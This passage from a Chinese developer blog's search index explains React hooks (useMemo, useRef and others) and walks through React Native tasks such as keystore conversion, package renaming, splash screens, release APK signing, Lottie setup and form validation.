/\u0026gt;重新渲染。\n但是，作为次要效果，在重新渲染期间，阶乘会再次重新计算 -\u0026lsquo;factorialOf(n) called!\u0026lsquo;记录到控制台。\n当组件重新渲染时，如何记住阶乘计算？这时候就是使用 useMemo() 的时候了。\n通过使用useMemo(() =\u0026gt; factorialOf(number), [number])而不是普通的 factorialOf(number)。React 记住阶乘计算。\n改进\u0026lt;CalculateFactorial /\u0026gt;并记住阶乘计算：\nimport { useState, useMemo } from 'react';\rexport function CalculateFactorial() {\rconst [number, setNumber] = useState(1);\rconst [inc, setInc] = useState(0);\r-----------------------------------------------------------------------\rconst factorial = useMemo(() =\u0026gt; factorialOf(number), [number]);\r-----------------------------------------------------------------------\rconst onChange = event =\u0026gt; {\rsetNumber(Number(event.target.value));\r};\rconst onClick = () =\u0026gt; setInc(i =\u0026gt; i + 1);\rreturn (\r\u0026lt;div\u0026gt;\rFactorial of \u0026lt;input type=\u0026quot;number\u0026quot; value={number} onChange={onChange} /\u0026gt;\ris {factorial}\r\u0026lt;button onClick={onClick}\u0026gt;Re-render\u0026lt;/button\u0026gt;\r\u0026lt;/div\u0026gt;\r);\r}\rfunction factorialOf(n) {\rconsole.log('factorialOf(n) called!');\rreturn n \u0026lt;= 0 ? 1 : n * factorialOf(n - 1);\r}\r每次更改数字的值时，\u0026lsquo;factorialOf(n) called!\u0026lsquo;都会记录到控制台。这是预期的。\n但是，如果您单击重新渲染按钮，\u0026lsquo;factorialOf(n) called!\u0026lsquo;则不会记录到控制台，因为useMemo(() =\u0026gt; factorialOf(number), [number])返回记忆化的阶乘计算。很棒！\n2). useMemo()与useCallback() useCallback() 与 useMemo() 相比，是一个更专业的钩子，可以记住回调：\nimport { useCallback } from 'react';\rfunction MyComponent({ prop }) {\rconst callback = () =\u0026gt; {\rreturn 'Result';\r};\rconst memoizedCallback = useCallback(callback, [prop]);\rreturn \u0026lt;ChildComponent callback={memoizedCallback} /\u0026gt;;\r}\r在上面的示例中，useCallback(() =\u0026gt; {...}, [prop])只要prop依赖项相同，就返回相同的函数实例。\n可以使用useMemo()做相同的方式来记忆回调：\nimport { useMemo } from 'react';\rfunction MyComponent({ prop }) {\rconst callback = () =\u0026gt; {\rreturn 'Result';\r};\rconst memoizedCallback = useMemo(() =\u0026gt; callback, [prop]);\rreturn \u0026lt;ChildComponent callback={memoizedCallback} /\u0026gt;;\r}\r3). 小心使用记忆(memoization) 虽然useMemo()可以提高组件的性能，但必须确保使用和不使用挂钩来配置组件。只有在那之后才能得出是否值得记忆的结论。\n当记忆使用不当时，可能会损害性能。\n4). 结语 useMemo(() =\u0026gt; computation(a, b), [a, b])是记住昂贵计算的钩子。\n给定相同的[a, b]依赖项，一旦记忆，钩子将返回记忆值而不调用computation(a, b)\n7. useRef React.useRef()钩子创建持久化的可变值（也称为 ref/reference ），以及访问 DOM 元素。\n1). 可变值 useRef(initialValue)是一个内置的 React 钩子，它接受一个参数作为初始值并返回一个引用（又名ref）。引用是具有特殊属性的对象current。\n1 2 3 4 5 6 7 8 9 10 11 12  import { useRef } from \u0026#39;react\u0026#39;; function MyComponent() { const reference = useRef(initialValue); const someHandler = () =\u0026gt; { // Access reference value:  const value = reference.current; // Update reference value:  reference.current = newValue; }; // ... }   reference.current 访问 ref 值，reference.current = newValue 更新 ref 值。很简单。\n用例：记录按钮点击 该组件LogButtonClicks使用ref来存储按钮的点击次数：\nimport { useRef } from 'react';\rfunction LogButtonClicks() {\rconst countRef = useRef(0);\rconst handle = () =\u0026gt; {\rcountRef.current++;\rconsole.log(`Clicked ${countRef.current} times`);\r};\rconsole.log('I rendered!');\rreturn \u0026lt;button onClick={handle}\u0026gt;Click me\u0026lt;/button\u0026gt;;\r}\rconst countRef = useRef(0)创建一个用countRef初始化的ref0。\n单击按钮时，handle将调用函数并递增ref值：countRef.current++。ref值记录到控制台。\n更新ref值countRef.current++不会触发组件重新渲染。这可以通过'I rendered!'在初始渲染时仅记录到控制台一次的事实来证明，并且在更新ref时不会发生重新渲染。\n现在提出一个合理的问题：ref和state之间的主要区别是什么？\n1.1). ref 和 state 的区别 重用LogButtonClicks组件，但这次使用useState()钩子来计算按钮点击次数：\nimport { useState } from 'react';\rfunction LogButtonClicks() {\rconst [count, setCount] = useState(0);\rconst handle = () =\u0026gt; {\rconst updatedCount = count + 1;\rconsole.log(`Clicked ${updatedCount} times`);\rsetCount(updatedCount);\r};\rconsole.log('I rendered!');\rreturn \u0026lt;button onClick={handle}\u0026gt;Click me\u0026lt;/button\u0026gt;;\r}\r每次单击时，都会在控制台中看到消息\u0026rsquo;I rendered!'—— 这意味着每次更新状态时，组件都会重新渲染。\n因此，引用和状态之间的两个主要区别：\n 更新ref不会触发重新渲染，而更新state会使组件重新渲染； ref更新是同步的（更新后的ref值立即可用），而state更新是异步的（重新渲染后更新状态变量）。  从更高的角度来看，ref存储副作用的基础结构数据，而state存储直接呈现在屏幕上的信息。\n用例：实现秒表 可以将副作用的ref基础结构数据存储在内部。例如，可以存储到ref指针中：计时器 ID、套接字 ID 等。\n该组件Stopwatch使用setInterval(callback, time)计时器功能每秒增加秒数的计数器。计时器 id 存储到ref中timerIdRef：\nimport { useRef, useState, useEffect } from 'react';\rfunction Stopwatch() {\rconst timerIdRef = useRef(0);\rconst [count, setCount] = useState(0);\rconst startHandler = () =\u0026gt; {\rif (timerIdRef.current) { return; }\rtimerIdRef.current = setInterval(() =\u0026gt; setCount(c =\u0026gt; c+1), 1000);\r};\rconst stopHandler = () =\u0026gt; {\rclearInterval(timerIdRef.current);\rtimerIdRef.current = 0;\r};\ruseEffect(() =\u0026gt; {\rreturn () =\u0026gt; clearInterval(timerIdRef.current);\r}, []);\rreturn (\r\u0026lt;div\u0026gt;\r\u0026lt;div\u0026gt;Timer: {count}s\u0026lt;/div\u0026gt;\r\u0026lt;div\u0026gt;\r\u0026lt;button onClick={startHandler}\u0026gt;Start\u0026lt;/button\u0026gt;\r\u0026lt;button onClick={stopHandler}\u0026gt;Stop\u0026lt;/button\u0026gt;\r\u0026lt;/div\u0026gt;\r\u0026lt;/div\u0026gt;\r);\r}\rstartHandler()单击Start按钮时调用timerIdRef.current = setInterval(...)函数启动计时器并将计时器 id 保存在ref中。\n用户单击停止按钮停止秒表。停止按钮处理程序stopHandler()从ref访问计时器ID，并停止定时器clearInterval(timerIdRef.current)。\n此外，如果组件在秒表处于活动状态的情况下卸载，则useEffect()的清理功能也将停止计时器。\n在秒表示例中，ref用于存储基础设施数据 — 活动计时器 ID。\n附带挑战：通过添加重置按钮来改进秒表\n//待编写\r2). 访问 DOM 元素 useRef()钩子的另一个有用的应用是访问 DOM 元素。这分 3 个步骤执行：\n 定义访问元素的ref const elementRef = useRef()； 将ref分配给ref元素的属性：\u0026lt;div ref={elementRef}\u0026gt;\u0026lt;/div\u0026gt;; 挂载后，elementRef.current指向DOM元素。  import { useRef, useEffect } from 'react';\rfunction AccessingElement() {\rconst elementRef = useRef();\ruseEffect(() =\u0026gt; {\rconst divElement = elementRef.current;\rconsole.log(divElement); // logs \u0026lt;div\u0026gt;I'm an element\u0026lt;/div\u0026gt;\r}, []);\rreturn (\r\u0026lt;div ref={elementRef}\u0026gt;\rI'm an element\r\u0026lt;/div\u0026gt;\r);\r}\r用例：聚焦输入 访问 DOM 元素，以便在组件挂载时关注输入字段。\n要使其工作，需要创建对输入的ref，将ref分配给标签的ref属性，并在安装后调用element.focus()元素上的特殊方法。\n这是该\u0026lt;InputFocus\u0026gt;组件的可能实现：\nimport { useRef, useEffect } from 'react';\rfunction InputFocus() {\rconst inputRef = useRef();\ruseEffect(() =\u0026gt; {\rinputRef.current.focus();\r}, []);\rreturn (\r\u0026lt;input ref={inputRef} type=\u0026quot;text\u0026quot; /\u0026gt;\r);\r}\rconst inputRef = useRef() 创建一个ref来保存输入元素。\n然后inputRef分配给输入字段的属性ref：\u0026lt;input ref={inputRef} type=\u0026quot;text\u0026quot; /\u0026gt;。\n然后，在安装后，设置inputRef.current为输入元素。现在，可以通过编程将焦点设置输入到：inputRef.current.focus()。\nRef 在初始渲染时为空 在初始渲染期间，保存 DOM 元素的ref应该是空的：\nimport { useRef, useEffect } from 'react';\rfunction InputFocus() {\rconst inputRef = useRef();\ruseEffect(() =\u0026gt; {\r// Logs `HTMLInputElement` console.log(inputRef.current);\rinputRef.current.focus();\r}, []);\r// Logs `undefined` during initial rendering\rconsole.log(inputRef.current);\rreturn \u0026lt;input ref={inputRef} type=\u0026quot;text\u0026quot; /\u0026gt;;\r}\r在初始渲染期间，React 仍不确定组件的输出是什么，因此还没有创建 DOM 结构。这就是为什么在初始渲染期间inputRef.current评估为undefined。\nuseEffect(callback, []) 当输入元素已经在 DOM 中创建时，钩子在挂载后立即调用回调。\ncallback的函数useEffect(callback, [])使inputRef.current访问的正确位置，因为它可以保证构建 DOM。\n3). 更新ref限制 功能组件的功能范围应该计算输出或调用钩子。\n这就是为什么不应该在组件功能的直接范围内执行更新ref（以及更新state）的原因。\n必须在useEffect()回调或处理程序（事件处理程序、计时器处理程序等）内部更新ref。\nimport { useRef, useEffect } from 'react';\rfunction MyComponent({ prop }) {\rconst myRef = useRef(0);\ruseEffect(() =\u0026gt; {\rmyRef.current++; // Good!\rsetTimeout(() =\u0026gt; {\rmyRef.current++; // Good!\r}, 1000);\r}, []);\rconst handler = () =\u0026gt; {\rmyRef.current++; // Good!\r};\rmyRef.current++; // Bad!\rif (prop) {\rmyRef.current++; // Bad!\r}\rreturn \u0026lt;button onClick={handler}\u0026gt;My button\u0026lt;/button\u0026gt;;\r}\r4). 总结 useRef() 钩子创建引用。\nconst reference = useRef(initialValue)使用初始值调用会返回一个名为 reference 的特殊对象。\nref对象有一个属性current：你可以使用这个属性来读取ref值reference.current，或者更新reference.current = newValue。\n在组件重新渲染之间，引用的值是持久的。\n与更新状态相反，更新引用不会触发组件重新渲染。\n引用也可以访问 DOM 元素。将引用分配给ref您要访问的元素的属性：\u0026lt;div ref={reference}\u0026gt;Element\u0026lt;/div\u0026gt;— 该元素位于reference.current。\n8. useImperativeHandle useImperativeHandle(ref, createHandle, [deps])\ruseImperativeHandle 可以让你在使用 ref 时自定义暴露给父组件的实例值。在大多数情况下，应当避免使用 ref 这样的命令式代码。\nuseImperativeHandle 应当与 forwardRef 一起使用：\nfunction FancyInput(props, ref) {\rconst inputRef = useRef();\ruseImperativeHandle(ref, () =\u0026gt; ({\rfocus: () =\u0026gt; {\rinputRef.current.focus();\r}\r}));\rreturn \u0026lt;input ref={inputRef} ... /\u0026gt;;\r}\rFancyInput = forwardRef(FancyInput);\r在本例中，渲染 \u0026lt;FancyInput ref={inputRef} /\u0026gt; 的父组件可以调用 inputRef.current.focus()。\n9. useDebugValue useDebugValue(value)\ruseDebugValue 可用于在 React 开发者工具中显示自定义 hook 的标签。\n例如，自定义 Hook 章节中描述的名为 useFriendStatus 的自定义 Hook：\nfunction useFriendStatus(friendID) {\rconst [isOnline, setIsOnline] = useState(null);\r// ...\r// 在开发者工具中的这个 Hook 旁边显示标签\r// e.g. \u0026quot;FriendStatus: Online\u0026quot;\ruseDebugValue(isOnline ? 'Online' : 'Offline');\rreturn isOnline;\r}\rReact 不推荐你向每个自定义 Hook 添加 debug 值。当它作为共享库的一部分时才最有价值。\n延迟格式化 debug 值 在某些情况下，格式化值的显示可能是一项开销很大的操作。除非需要检查 Hook，否则没有必要这么做。\n因此，useDebugValue 接受一个格式化函数作为可选的第二个参数。\n该函数只有在 Hook 被检查时才会被调用。它接受 debug 值作为参数，并且会返回一个格式化的显示值。\n例如，一个返回 Date 值的自定义 Hook 可以通过格式化函数来避免不必要的 toDateString 函数调用：\nuseDebugValue(date, date =\u0026gt; date.toDateString());\r","description":"Hook 是 React 16.8 的新增特性。它可以在不编写 class 的情况下使用 state 以及其他的 React 特性","id":35,"section":"react","tags":null,"title":"Hooks 最佳实践","uri":"https://danacoding.github.io/react/hooks/hooks-bp/"},{"content":"一、将.pk8 和.pem 转换成 react-native 的 debug.keystore Step1. 安装 openssl\n参考：https://stackoverflow.com/questions/42918916/npm-install-openssl-failed-on-windows-10\nStep2. 把 pkcs8 格式的私钥转换为 pkcs12 格式，生成 platform.priv.pem 文件\nopenssl pkcs8 -in platform.pk8 -inform DER -outform PEM -out platform.priv.pem -nocrypt\rStep3. 生成 pkcs12 格式的密钥文件,生成 platform.pk12 文件，最后的 brilliance 是 keystore 的 alias，需要输入两次密码，我们这里默认为 android\nopenssl pkcs12 -export -in platform.x509.pem -inkey platform.priv.pem -out platform.pk12 -name brilliance\rStep4. 生成 platform.keystore\nkeytool -importkeystore -deststorepass android -destkeypass android -destkeystore platform.keystore -srckeystore platform.pk12 -srcstoretype PKCS12 -srcstorepass android -alias brillianc\r二、React-Native 重命名 package \u0026amp; 重命名 app 1. 重命名 package  Step1. 重命名文件夹\n android/app/src/main/java/MY/APP/OLD_ID/ 重命名为： android/app/src/ main/java/MY/APP/NEW_ID/\n 这里的 NEW_ID 也可能是多级文件夹，例如： com/fungmo/a08\n  Step2. 配置包 ID\n 1.在 android/app/src/main/java/MY/APP/NEW_ID/MainActivity.java 中：\npackage MY.APP.NEW_ID; //这里的 MY.APP.NEW_ID 项目中为例如 com.fungmo.a08\r2.在 android/app/src/main/java/MY/APP/NEW_ID/MainApplication.java 中：\npackage MY.APP.NEW_ID; //这里的 MY.APP.NEW_ID 项目中为例如 com.fungmo.a08\rimport MY.APP.NEW_ID.generated.BasePackageList; //这里的 MY.APP.NEW_ID 项目中为例如 com.fungmo.a08\rClass\u0026lt;?\u0026gt; aClass = Class.forName(\u0026quot;MY.APP.NEW_ID.ReactNativeFlipper\u0026quot;); //这里的 MY.APP.NEW_ID 项目中为例如 com.fungmo.a08\r3.在 android/app/src/main/AndroidManifest.xml 中：\npackage=\u0026quot;MY.APP.NEW_ID\u0026quot; //这里的 MY.APP.NEW_ID 项目中为例如 com.fungmo.a08\r4.在 android/app/build.gradle 中：\napplicationId \u0026quot;MY.APP.NEW_ID\u0026quot; //这里的 MY.APP.NEW_ID 项目中为例如 com.fungmo.a08\r5.在 android/app/BUCK 中：\nandroid_build_config(\rpackage=\u0026quot;MY.APP.NEW_ID\u0026quot; //这里的 MY.APP.NEW_ID 项目中为例如 com.fungmo.a08\r)\randroid_resource(\rpackage=\u0026quot;MY.APP.NEW_ID\u0026quot; //这里的 MY.APP.NEW_ID 项目中为例如 com.fungmo.a08\r)\r Step3. 最后进行 Gradle 清理（在 /android 文件夹中）：\n gradlew clean //cmd\r//或者\r./gradlew clean //powershell\r2、重命名 app 生成器不会覆盖位于 android/app/src/main/res/values/ 文件夹中的 strings.xml 文件，因此必须 手动更改 app_name 变量\n\u0026lt;?xml version=\u0026quot;1.0\u0026quot; encoding=\u0026quot;UTF-8\u0026quot; standalone=\u0026quot;yes\u0026quot;?\u0026gt;\r\u0026lt;resources\u0026gt;\r\u0026lt;string name=\u0026quot;app_name\u0026quot;\u0026gt;用户手册\u0026lt;/string\u0026gt;\r\u0026lt;/resources\u0026gt;\r三、RN 启动屏 npm i react-native-splash-screen --save\r 配置参考\n Step1. 转到app/src/main/java/[packageName]并创建一个新文件SplashActivity.java然后将以下代码复制粘贴到其中。\npackage com.packagename; // Replace this with your package name 替换为自己的 package 名\rimport android.content.Intent;\rimport android.os.Bundle;\rimport androidx.appcompat.app.AppCompatActivity;\rpublic class SplashActivity extends AppCompatActivity {\r@Override\rprotected void onCreate(Bundle savedInstanceState) {\rsuper.onCreate(savedInstanceState);\rIntent intent = new Intent(this, MainActivity.class);\rstartActivity(intent);\rfinish();\r}\r}\rStep2. 去app/src/main/AndroidManifest.xml和修改它，如下所示使用SplashActivity： 在\u0026lt;application\u0026gt;标签内添加以下活动。\n\u0026lt;activity\randroid:name=\u0026quot;.SplashActivity\u0026quot;\randroid:theme=\u0026quot;@style/SplashTheme\u0026quot;\randroid:label=\u0026quot;@string/app_name\u0026quot;\r\u0026gt;\r\u0026lt;intent-filter\u0026gt;\r\u0026lt;action android:name=\u0026quot;android.intent.action.MAIN\u0026quot; /\u0026gt;\r\u0026lt;category android:name=\u0026quot;android.intent.category.LAUNCHER\u0026quot; /\u0026gt;\r\u0026lt;/intent-filter\u0026gt;\r\u0026lt;/activity\u0026gt;\r从MainActivity标签中删除以下意图。\n\u0026lt;intent-filter\u0026gt;\r\u0026lt;action android:name=\u0026quot;android.intent.action.MAIN\u0026quot; /\u0026gt;\r\u0026lt;category android:name=\u0026quot;android.intent.category.LAUNCHER\u0026quot; /\u0026gt;\r\u0026lt;/intent-filter\u0026gt;\r并添加android:exported=\u0026quot;true\u0026quot;该活动。 现在，您的AndroidManifest.xml应该如下所示：\n\u0026lt;manifest xmlns:android=\u0026quot;http://schemas.android.com/apk/res/android\u0026quot;\rpackage=\u0026quot;com.packagename\u0026quot;\u0026gt;\r\u0026lt;uses-permission android:name=\u0026quot;android.permission.INTERNET\u0026quot; /\u0026gt;\r\u0026lt;application\randroid:name=\u0026quot;.MainApplication\u0026quot;\randroid:label=\u0026quot;@string/app_name\u0026quot;\randroid:icon=\u0026quot;@mipmap/ic_launcher\u0026quot;\randroid:roundIcon=\u0026quot;@mipmap/ic_launcher\u0026quot;\randroid:allowBackup=\u0026quot;false\u0026quot;\randroid:theme=\u0026quot;@style/AppTheme\u0026quot;\u0026gt;\r\u0026lt;activity\randroid:name=\u0026quot;.SplashActivity\u0026quot;\randroid:theme=\u0026quot;@style/SplashTheme\u0026quot;\randroid:label=\u0026quot;@string/app_name\u0026quot;\r\u0026gt;\r\u0026lt;intent-filter\u0026gt;\r\u0026lt;action android:name=\u0026quot;android.intent.action.MAIN\u0026quot; /\u0026gt;\r\u0026lt;category android:name=\u0026quot;android.intent.category.LAUNCHER\u0026quot; /\u0026gt;\r\u0026lt;/intent-filter\u0026gt;\r\u0026lt;/activity\u0026gt;\r\u0026lt;activity\randroid:name=\u0026quot;.MainActivity\u0026quot;\randroid:label=\u0026quot;@string/app_name\u0026quot;\randroid:configChanges=\u0026quot;keyboard|keyboardHidden|orientation|screenSize|uiMode\u0026quot;\randroid:launchMode=\u0026quot;singleTask\u0026quot;\randroid:windowSoftInputMode=\u0026quot;adjustResize\u0026quot;\randroid:exported=\u0026quot;true\u0026quot;\r\u0026gt;\r\u0026lt;/activity\u0026gt;\r\u0026lt;activity android:name=\u0026quot;com.facebook.react.devsupport.DevSettingsActivity\u0026quot; /\u0026gt;\r\u0026lt;/application\u0026gt;\r\u0026lt;/manifest\u0026gt;\rStep3. 现在，我们将声明SplashThemefor SplashActivity。转到app/src/main/res/values/styles.xml并在\u0026lt;resources\u0026gt;中添加以下样式。\n\u0026lt;style name=\u0026quot;SplashTheme\u0026quot; parent=\u0026quot;Theme.AppCompat.Light.NoActionBar\u0026quot;\u0026gt;\r\u0026lt;item name=\u0026quot;android:background\u0026quot;\u0026gt;@drawable/background_splash\u0026lt;/item\u0026gt;\r\u0026lt;item name=\u0026quot;android:statusBarColor\u0026quot;\u0026gt;@color/background\u0026lt;/item\u0026gt;\r\u0026lt;/style\u0026gt;\rStep4. 转到android\\app\\src\\main\\res\\values并创建一个文件（colors.xml如果尚不存在）。 我们在上面使用了背景颜色常量，因此必须将其添加到colors.xml文件中。\n\u0026lt;?xml version=\u0026quot;1.0\u0026quot; encoding=\u0026quot;utf-8\u0026quot;?\u0026gt;\r\u0026lt;resources\u0026gt;\r\u0026lt;!-- Insert your background color for the splash screen --\u0026gt;\r\u0026lt;color name=\u0026quot;background\u0026quot;\u0026gt;#fff\u0026lt;/color\u0026gt;\r\u0026lt;/resources\u0026gt;\rStep5. 转到android/app/src/main/res/drawable（如果尚不存在，则创建drawable文件夹）并将您的启动屏幕图像（名称应为splash_screen.png）放在此处，并background_splash.xml使用以下代码创建文件：\n\u0026lt;?xml version=\u0026quot;1.0\u0026quot; encoding=\u0026quot;utf-8\u0026quot;?\u0026gt;\r\u0026lt;layer-list xmlns:android=\u0026quot;http://schemas.android.com/apk/res/android\u0026quot;\u0026gt;\r\u0026lt;item android:drawable=\u0026quot;@color/background\u0026quot; /\u0026gt;\r\u0026lt;item\randroid:drawable=\u0026quot;@drawable/splash_screen\u0026quot;\randroid:height=\u0026quot;300dp\u0026quot;\randroid:width=\u0026quot;300dp\u0026quot;\randroid:gravity=\u0026quot;center\u0026quot;\r/\u0026gt;\r\u0026lt;/layer-list\u0026gt;\r如果您的初始屏幕的尺寸是等于设备屏幕的尺寸，在\u0026lt;item\u0026gt;标签中删除android:height和android:width。\nStep6. react-native-splash-screen在您的项目中安装模块，然后SplashScreen从 App.js 文件中导入它。 import SplashScreen from 'react-native-splash-screen'; 我们只需要显示初始屏幕，直到安装第一个组件，然后useEffect在 App 组件主体内（返回之前）制作一个钩子，如下所示： 不要忘了import useEffect from 'react'。\nuseEffect(() =\u0026gt; {\rSplashScreen.hide();\r}, []);\rStep7. 转到app/src/main/java/[packageName]/MainActivity.java并导入以下模块，然后导入其他模块。\nimport org.devio.rn.splashscreen.SplashScreen;\rimport android.os.Bundle;\r将此方法添加到MainActivity类的顶部。\n@Override\rprotected void onCreate(Bundle savedInstanceState) {\rSplashScreen.show(this, R.style.SplashStatusBarTheme);\rsuper.onCreate(savedInstanceState);\r}\rStep8. 去android/app/src/main/res/values/styles.xml添加SplashStatusBarTheme，就像我们在第 3 步一样。\n\u0026lt;style name=\u0026quot;SplashStatusBarTheme\u0026quot; parent=\u0026quot;SplashScreen_SplashTheme\u0026quot;\u0026gt;\r\u0026lt;item name=\u0026quot;android:statusBarColor\u0026quot;\u0026gt;@color/background\u0026lt;/item\u0026gt;\r\u0026lt;/style\u0026gt;\r如果不这样做，则在加载应用程序的 JS 代码时，StatusBar 的颜色将变为黑色。\nStep9. 转到android/app/src/main/res/并创建一个新文件夹layout（如果尚不存在）。在该文件夹中，创建一个文件launch_screen.xml（，需要此文件react-native-splash-screen library）。在该文件内，使用以前创建的背景创建布局，如下所示：\n\u0026lt;?xml version=\u0026quot;1.0\u0026quot; encoding=\u0026quot;utf-8\u0026quot;?\u0026gt;\r\u0026lt;LinearLayout xmlns:android=\u0026quot;http://schemas.android.com/apk/res/android\u0026quot;\randroid:orientation=\u0026quot;vertical\u0026quot;\randroid:layout_width=\u0026quot;match_parent\u0026quot;\randroid:layout_height=\u0026quot;match_parent\u0026quot;\randroid:background=\u0026quot;@drawable/background_splash\u0026quot;\r/\u0026gt;\rStep10. ·android/app/src/main/res/values/colors.xml·像在步骤 4 中一样转到并添加以下标签，否则，该应用程序将崩溃。不要更改颜色值。\n\u0026lt;color name=\u0026quot;primary_dark\u0026quot;\u0026gt;#000\u0026lt;/color\u0026gt;\r四、ReactNative 签名打包 apk(android)  step1. 生成一个签名密钥\n C:\\Program Files\\Java\\jdk1.8.0_271\\bin 目录中，执行\nkeytool -genkeypair -v -keystore my-release-key.keystore -alias my-key-alias -keyalg RSA -keysize 2048 -validity 10000\r生成 my-release-key.keystore 密钥库文件\n Step2. 设置 gradle 变量\n 1.把 my-release-key.keystore 文件放到你工程中的 android/app 文件夹下。 2.编辑项目目录 /android/gradle.properties 如果没有 gradle.properties 文件你就自己创建一个，添加如下的代码（注意把其中的**替换为相应密码）\nMYAPP_RELEASE_STORE_FILE=my-release-key.keystore\rMYAPP_RELEASE_KEY_ALIAS=my-key-alias\rMYAPP_RELEASE_STORE_PASSWORD=*****\rMYAPP_RELEASE_KEY_PASSWORD=*****\r Step3. 把签名配置加入到项目的 android/app/build.gradle 配置中\n ...\randroid {\r...\rdefaultConfig { ... }\rsigningConfigs {\r+ release {\rif (project.hasProperty('MYAPP_RELEASE_STORE_FILE')) {\rstoreFile file(MYAPP_RELEASE_STORE_FILE)\rstorePassword MYAPP_RELEASE_STORE_PASSWORD\rkeyAlias MYAPP_RELEASE_KEY_ALIAS\rkeyPassword MYAPP_RELEASE_KEY_PASSWORD\r}\r}\r}\rbuildTypes {\rrelease {\r...\r+ signingConfig signingConfigs.release\r}\r}\r}\r...\r step4. 生成发行 APK 包\n 项目 android 目录中，执行\ngradlew assembleRelease //cmd 或者\r./gradlew assembleRelease //PowerShell\r生成的 APK 文件位于 android/app/build/outputs/apk/release/app-release.apk\n如果需要重新打包，需先删除 \\android\\app\\build\\outputs\\apk 中的 release 文件夹\n step5. 测试发行版本\n npx react-native run-android --variant=release\r五、RN/Expo 渲染本地图片(资源)列表 由于 RN 中引用本地图片是用require，而 require 是运行时编译的，所以不能在 require 中添加变量。参考 Link\nStep1. 将所需要的本地图片 Require 到一处\nconst image1 = require('../assets/Image1.png')\rconst image2 = require('../assets/Image2.png')\rStep2. 创建一个数组对象\nconst data = [\r{\u0026quot;id\u0026quot;:1, \u0026quot;url\u0026quot;: image1},\r{\u0026quot;id\u0026quot;:2, \u0026quot;url\u0026quot;: image2}\r]\rStep3. 这样就可以使用 map 渲染 data 数据并正确使用本地图片了\nconst listItems = data.map(item =\u0026gt;\r\u0026lt;View key={item.id}\u0026gt;\r\u0026lt;Image source={item.url} /\u0026gt;\r\u0026lt;/View\u0026gt;\r)\r六、Lottie（lottie-react-native） Lottie是以json格式导出的Adobe After Effects动画库，并在移动设备和Web上渲染。\n本文只介绍RN安卓端的配置。\n一. 安装 （React Native \u0026gt;= 0.60.0）\nyarn add lottie-react-native\r二. 配置文件（如果应用在Android上崩溃，则表示自动链接无效。才需要进行以下配置：）\n//1. android/app/src/main/java/\u0026lt;AppName\u0026gt;/MainApplication.java\r// 在文件入口（头部），添加\rimport com.airbnb.android.react.lottie.LottiePackage;\r// 在List \u0026lt;ReactPackage\u0026gt; getPackages()中，添加\rpackages.add(new LottiePackage());\r//2. android/app/build.gradle\r// 在 dependencies 块中，添加\rimplementation project(':lottie-react-native')\r//3. android/settings.gradle\rinclude ':lottie-react-native'\rproject(':lottie-react-native').projectDir = new File(rootProject.projectDir, '../node_modules/lottie-react-native/src/android')\r三. 使用\nimport React from 'react';\rimport LottieView from 'lottie-react-native';\rexport default class BasicExample extends React.Component {\rrender() {\rreturn \u0026lt;LottieView source={require('./assets/my.json')} autoPlay loop /\u0026gt;;\r}\r}\r// 其中，assets 是手动在项目根目录中创建的文件夹，这里的my.json即是lottie动画文件\n动画文件：lottiefiles\n四. 安装完新依赖/新添文件后需要重新编译到安卓设备中，yarn android\n七、RN表单验证 这里纯手写，当然也可以使用react-hooks-form等第三方库。 注意：select 的处理方式\nimport React, { Component } from \u0026quot;react\u0026quot;;\rimport { StyleSheet, KeyboardAvoidingView, TouchableWithoutFeedback, Keyboard } from \u0026quot;react-native\u0026quot;;\rimport { Layout, Input, Button, Select, SelectItem, IndexPath } from \u0026quot;@ui-kitten/components\u0026quot;;\rconst validEmailRegex = RegExp(\r/^(([^\u0026lt;\u0026gt;()\\[\\]\\.,;:\\s@\\\u0026quot;]+(\\.[^\u0026lt;\u0026gt;()\\[\\]\\.,;:\\s@\\\u0026quot;]+)*)|(\\\u0026quot;.+\\\u0026quot;))@(([^\u0026lt;\u0026gt;()[\\]\\.,;:\\s@\\\u0026quot;]+\\.)+[^\u0026lt;\u0026gt;()[\\]\\.,;:\\s@\\\u0026quot;]{2,})$/i\r);\rconst validateForm = errors =\u0026gt; {\rlet valid = true;\rObject.values(errors).forEach(val =\u0026gt; val.length \u0026gt; 0 \u0026amp;\u0026amp; (valid = false));\rreturn valid;\r};\rconst data = [//1.select初始数据\r'A',\r'B',\r'C',\r];\rexport default class FormComponent extends Component {\rconstructor(props) {\rsuper(props);\rthis.state = {\rselectedIndex: new IndexPath(0),//2.select初始选中\rfullName: null,\remail: null,\rpassword: null,\rerrors: {\rfullName: \u0026quot;\u0026quot;,\remail: \u0026quot;\u0026quot;,\rpassword: \u0026quot;\u0026quot;\r}\r};\r}\rhandlePress = () =\u0026gt; {\rif (this.isNotEmpty()) {\rif (validateForm(this.state.errors)) {\rKeyboard.dismiss();\r// alert(\u0026quot;Created successfully.\u0026quot;);\rconst postData = {\r\u0026quot;typeFeedBack\u0026quot;:data[this.state.selectedIndex.row],//3.select选中数据\r}\rconsole.log(postData)\r}\r} else {\rvalidateForm(this.state.errors);\r}\r};\rhandleChange = (field, value) =\u0026gt; {\rlet errors = this.state.errors;\rswitch (field) {\rcase \u0026quot;fullName\u0026quot;:\rerrors.fullName = value.length \u0026lt; 5 ? \u0026quot;Full Name must be 5 characters long!\u0026quot; : \u0026quot;\u0026quot;;\rbreak;\rcase \u0026quot;email\u0026quot;:\rerrors.email = validEmailRegex.test(value) ? \u0026quot;\u0026quot; : \u0026quot;Email is not valid!\u0026quot;;\rbreak;\rcase \u0026quot;password\u0026quot;:\rerrors.password = value.length \u0026lt; 8 ? \u0026quot;Password must be 8 characters long!\u0026quot; : \u0026quot;\u0026quot;;\rbreak;\rdefault:\rbreak;\r}\rthis.setState({ errors, [field]: value });\r};\risNotEmpty = () =\u0026gt; {\rconst { fullName, email, password } = this.state;\rlet isNoError = true;\rif (!fullName) {\rthis.setState(prevState =\u0026gt; ({\rerrors: {\r...prevState.errors,\rfullName: \u0026quot;Full Name is required.\u0026quot;\r}\r}));\risNoError = false;\r}\rif (!email) {\rthis.setState(prevState =\u0026gt; ({\rerrors: {\r...prevState.errors,\remail: \u0026quot;Email Address is required.\u0026quot;\r}\r}));\risNoError = false;\r}\rif (!password) {\rthis.setState(prevState =\u0026gt; ({\rerrors: {\r...prevState.errors,\rpassword: \u0026quot;Password is required.\u0026quot;\r}\r}));\risNoError = false;\r}\rreturn isNoError;\r};\rrender() {\rconst { selectedIndex, fullName, email, password, errors } = this.state;\rconst displayValue = data[selectedIndex.row];//4.select选中的值\rconst renderOption = (title: string, index: number) =\u0026gt; (//5.select option\r\u0026lt;SelectItem key={index} title={title} /\u0026gt;\r);\rreturn (\r\u0026lt;KeyboardAvoidingView 